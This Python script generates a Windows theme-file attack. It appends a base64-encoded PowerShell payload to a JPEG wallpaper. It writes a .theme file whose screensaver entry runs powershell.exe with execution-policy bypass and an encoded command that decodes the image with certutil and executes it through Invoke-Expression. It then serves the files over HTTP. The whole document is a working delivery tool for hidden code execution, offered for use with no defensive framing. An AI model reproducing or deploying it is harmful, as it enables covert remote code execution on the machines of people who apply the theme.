# Ported to Python for Linux

import os
import base64
import subprocess

# Prompt the user for input files
ps_script_path = input("Enter the path to the PowerShell script you want to encode: ")
image_path = input("Enter the path to the image file you want to use for steganography: ")
output_file = input("Enter the name for the output steganographic image (without extension): ")

# Define the output directory
output_dir = os.path.expanduser("~/theme-attack")

# Create the output directory if it doesn't exist
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

# Encode the PowerShell script to Base64 using OpenSSL (as an alternative to CertUtil)
encoded_script_path = os.path.join(output_dir, "encoded_script.txt")
with open(ps_script_path, "rb") as script_file:
    encoded_script = base64.b64encode(script_file.read()).decode('utf-8')
    with open(encoded_script_path, "w") as encoded_file:
        encoded_file.write(encoded_script)

# Append the encoded script to the image
output_image_path = os.path.join(output_dir, f"{output_file}.jpg")
with open(image_path, "rb") as image_file, open(encoded_script_path, "r") as encoded_file, open(output_image_path, "wb") as output_image:
    output_image.write(image_file.read())
    output_image.write(encoded_file.read().encode('utf-8'))

# Clean up temporary encoded file
os.remove(encoded_script_path)

# The original PowerShell command
ps_command = """
$decodedContent = certutil -decode $outputDir\$outputFile.jpg stdout 2>&1 | Select-Object -Skip 1
Invoke-Expression -Command $decodedContent
"""

# Convert to Base64 (using UTF-16LE encoding, which PowerShell expects)
encoded_command = base64.b64encode(ps_command.encode("utf-16le")).decode("utf-8")

# Output the Base64 encoded command
print(encoded_command)

# Prompt user for network location to store wallpaper
network_location = input("Enter the network location for the wallpaper (e.g., \\192.168.1.103): ")

# Define the contents of the theme file
theme_content = f"""
[Control Panel\Desktop]
Wallpaper={network_location}\{output_file}.jpg
TileWallpaper=0
WallpaperStyle=2
ScreenSaveTimeOut=5

[Control Panel\Screensaver]
SCRNSAVE.EXE=powershell.exe -ExecutionPolicy Bypass -EncodedCommand "{encoded_command}"
"""

# Specify the path where you want to save the theme file
theme_file_path = os.path.join(output_dir, "custom_theme.theme")

# Write the contents to the theme file
with open(theme_file_path, "w") as theme_file:
    theme_file.write(theme_content)

print(f"Theme file created at: {theme_file_path}")
print(f"Image file created at: {output_image_path}")

# Change directory to the theme-attack folder
os.chdir(output_dir)

# Start the Python HTTP server in the current directory
print("Starting Python HTTP server to serve the files...")
subprocess.Popen(["python3", "-m", "http.server", "8080"])